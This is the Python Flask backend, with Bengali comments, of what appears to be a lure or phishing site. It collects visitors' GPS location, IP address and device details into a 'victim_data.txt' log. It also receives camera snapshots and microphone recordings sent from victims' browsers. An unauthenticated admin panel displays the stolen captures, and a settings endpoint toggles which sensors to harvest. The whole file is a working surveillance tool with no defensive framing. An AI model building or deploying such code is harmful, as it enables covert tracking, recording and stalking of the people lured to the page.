from flask import Flask, render_template, request, jsonify, send_from_directory
import base64
import os
import json
from datetime import datetime

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
SETTINGS_FILE = os.path.join(BASE_DIR, 'settings.json')

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# ডিফল্ট সেটিংস তৈরি করা
def get_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            return json.load(f)
    return {"camera": True, "location": True, "mic": False}

def save_settings(settings_data):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings_data, f)

@app.route('/')
def index():
    return render_template('index.html')

# --- সেটিংস কন্ট্রোল করার রুট (GET & POST) ---
@app.route('/api/settings', methods=['GET', 'POST'])
def handle_settings():
    if request.method == 'POST':
        save_settings(request.json)
        return jsonify({"status": "success"})
    return jsonify(get_settings())

# --- ইউজারের OSINT ও লোকেশন ডেটা সেভ করার রুট ---
@app.route('/submit_offer', methods=['POST'])
def submit_offer():
    try:
        data = request.json
        lat = data.get('lat', 'Disabled')
        lon = data.get('lon', 'Disabled')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.user_agent.string
        time_now = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
        
        if lat not in ['Unknown', 'Denied', 'Not Supported', 'Disabled']:
            location_data = f"https://www.google.com/maps?q={lat},{lon}"
        else:
            location_data = f"Location {lat}"
        
        log_entry = f"[{time_now}] 📍 Map: {location_data} | 🌐 IP: {ip} | 💻 Device: {user_agent}\n"
        
        with open(os.path.join(BASE_DIR, 'victim_data.txt'), 'a', encoding='utf-8') as f:
            f.write(log_entry)
            
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error"})

# --- ছবি রিসিভ করার রুট ---
@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        data = request.json
        image_data_url = data['image']
        encoded_data = image_data_url.split(',')[1]
        image_bytes = base64.b64decode(encoded_data)
        
        raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip = raw_ip.split(',')[0].strip() if raw_ip else "UnknownIP"
        safe_ip = ip.replace('.', '-')
        browser = request.user_agent.browser or "Unknown"
        safe_browser = str(browser).replace('_', '-')
        
        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        filename = f"capture_{timestamp}_{safe_ip}_{safe_browser}.png"
        
        with open(os.path.join(UPLOAD_FOLDER, filename), 'wb') as f:
            f.write(image_bytes)
            
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error"})

# --- অডিও রিসিভ করার রুট ---
@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        data = request.json
        audio_data_url = data['audio']
        
        encoded_data = audio_data_url.split(',')[1]
        audio_bytes = base64.b64decode(encoded_data)
        
        raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip = raw_ip.split(',')[0].strip() if raw_ip else "UnknownIP"
        safe_ip = ip.replace('.', '-')
        browser = request.user_agent.browser or "Unknown"
        safe_browser = str(browser).replace('_', '-')
        
        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        filename = f"mic_{timestamp}_{safe_ip}_{safe_browser}.webm" 
        
        with open(os.path.join(UPLOAD_FOLDER, filename), 'wb') as f:
            f.write(audio_bytes)
            
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"Audio upload error: {e}")
        return jsonify({"status": "error"})

# --- অ্যাডমিন প্যানেল রুট ---
@app.route('/admin')
def admin():
    log_file_path = os.path.join(BASE_DIR, 'victim_data.txt')
    logs = []
    if os.path.exists(log_file_path):
        with open(log_file_path, 'r', encoding='utf-8') as f:
            logs = f.readlines()
    logs.reverse()
    
    all_files = os.listdir(UPLOAD_FOLDER)
    all_files.sort(reverse=True)
    
    images_data = []
    audio_data = []
    
    for filename in all_files:
        parts = filename.replace('.png', '').replace('.webm', '').split('_')
        capture_time, ip, browser = "Unknown", "Unknown", "Unknown"
        
        if len(parts) >= 3:
            raw_time = parts[1]
            if len(raw_time) == 15:
                capture_time = datetime.strptime(raw_time, "%Y%m%d-%H%M%S").strftime("%Y-%m-%d %I:%M:%S %p")
            else:
                capture_time = raw_time
            ip = parts[2].replace('-', '.')
            if len(parts) >= 4:
                browser = parts[3].capitalize()

        if filename.endswith('.png'):
            images_data.append({'filename': filename, 'time': capture_time, 'ip': ip, 'browser': browser})
        elif filename.endswith('.webm'):
            audio_data.append({'filename': filename, 'time': capture_time, 'ip': ip, 'browser': browser})

    current_settings = get_settings()
    return render_template('admin.html', images=images_data, audios=audio_data, logs=logs, settings=current_settings)

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route('/delete/<filename>', methods=['POST'])
def delete_image(filename):
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath): os.remove(filepath)
    return jsonify({"status": "success"})

@app.route('/delete_all', methods=['POST'])
def delete_all():
    for f in os.listdir(UPLOAD_FOLDER):
        if os.path.isfile(os.path.join(UPLOAD_FOLDER, f)): os.remove(os.path.join(UPLOAD_FOLDER, f))
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)